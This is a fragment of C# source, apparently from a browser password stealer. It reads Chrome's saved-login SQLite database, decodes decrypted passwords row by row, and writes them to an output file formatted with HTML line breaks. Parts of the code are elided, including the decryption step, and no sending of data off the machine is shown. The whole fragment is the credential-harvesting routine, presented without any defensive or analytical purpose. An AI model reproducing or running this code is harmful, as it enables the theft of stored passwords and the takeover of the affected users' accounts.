...
public class Chrome
{
    ...
    private static void ShowLoading(int current, int total)
    {
        //Console.Write("Writting passwords ");
        //Console.WriteLine("{0} of {1} ", current, total);
    }
        ...
        try
        {
            ...
            using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
            {
                ...
                for (int i = 0; i < rows; i++)
                {
                    ...
                    string password = new UTF8Encoding(true, true).GetString(decrypted);
                    string result = i + ") " + "Site: " + DB.Rows[i][1] + "\nLogin:  " + DB.Rows[i][3] + "\nPassword:  " + password + "\n";
                    Writer.WriteLine(password + "<br><br>");
                    //Writer.Write(result);
                    ShowLoading(i + 1, rows);
                }
                Writer.Flush();
